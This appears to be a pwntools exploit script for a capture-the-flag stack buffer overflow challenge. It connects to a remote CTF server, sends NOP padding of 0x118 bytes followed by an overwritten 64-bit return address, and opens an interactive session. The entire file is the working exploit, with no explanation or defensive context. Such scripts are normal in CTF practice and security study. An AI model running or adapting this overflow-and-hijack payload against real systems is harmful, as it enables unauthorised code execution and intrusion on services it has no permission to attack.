from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3004)

payload = ''
payload += '\x90'*0x110
payload += '\x90'*0x8
payload += p64(0x0000000000400606)

p.sendline(payload)

p.interactive()
